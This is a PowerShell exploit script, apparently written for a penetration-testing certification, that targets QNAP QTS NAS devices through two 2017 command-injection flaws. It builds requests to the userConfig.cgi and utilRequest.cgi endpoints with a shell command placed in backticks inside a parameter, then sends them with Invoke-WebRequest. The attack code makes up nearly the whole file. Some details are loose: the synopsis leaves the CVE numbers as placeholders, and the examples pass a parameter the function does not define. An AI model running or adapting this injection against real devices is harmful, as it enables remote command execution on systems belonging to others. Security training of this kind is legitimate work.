function Command-Inject-QNAP
{ 

<#
.SYNOPSIS
Exploits CVE-2017-XXXX and CVE-2017-XXX, which affects QNAP TVS-663 QTS < 4.2.4 build 20170313. 

.DESCRIPTION
This has been ported to powershell from https://www.exploit-db.com/exploits/41842/ as it was just some curl scripts.
Credit goes to Harry Sintoenen from F-Secure, latest informaiton can be found at https://sintonen.fi/advisories/qnap-qts-multiple-rce-vulnerabilities.txt

.PARAMETER hostname
The IP Address or host name of the QNAP to exploit

.PARAMETER method
The method to run against the affected QNAP

.PARAMETER command
The command to run on the host

.EXAMPLE

PS C:> Command-Inject-QNAP -baseurl https://10.0.0.1 -method CVE-2017-6360 -command "echo;id"
PS C:> Command-Inject-QNAP -baseurl https://10.0.0.1 -method CVE-2017-6359 -command "echo;id"

.LINK


.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3237

https://sintonen.fi/advisories/qnap-qts-multiple-rce-vulnerabilities.txt
#>
    [CmdletBinding()]
    Param (
    
        [Parameter(Mandatory=$true)]
        [String]
        $hostname,

        [Parameter(Mandatory=$true)]
        [String]
        $method = $Null,

        [Parameter(Mandatory=$false)]
        [String]
        $command = "echo;id"
        
        
        
    )


    if( ($method -eq $Null) -or ($hostname -eq $Null) ) {

        Write-Warning "[-] No method"
        break
    }

    # Decide which CVE to exectue
    switch ($method){

            'CVE-2017-6360' { $url = "https://$hostname/cgi-bin/userConfig.cgi?func=cloudPersonalSmtp&sid=SIDVALUE&hash=``($command)>%262`` "}
            
            'CVE-2017-6359' { $url = "https://$hostname/cgi-bin/filemanager/utilRequest.cgi?func=cancel_trash_recovery&sid=SIDVALUE&pid=``$command``"}

            default         {
                Write-Warning "[-] Unkown method: $method"
                break
            }

    }

    
    try{
           
           Write-Host "[+] Url to send: $url"
           Invoke-WebRequest $url -OutFile "file" -PassThru | Select-Object -ExpandProperty Content
        }catch{
            Write-Error "[-] Error resposne from host: $Error[0]"
    }

}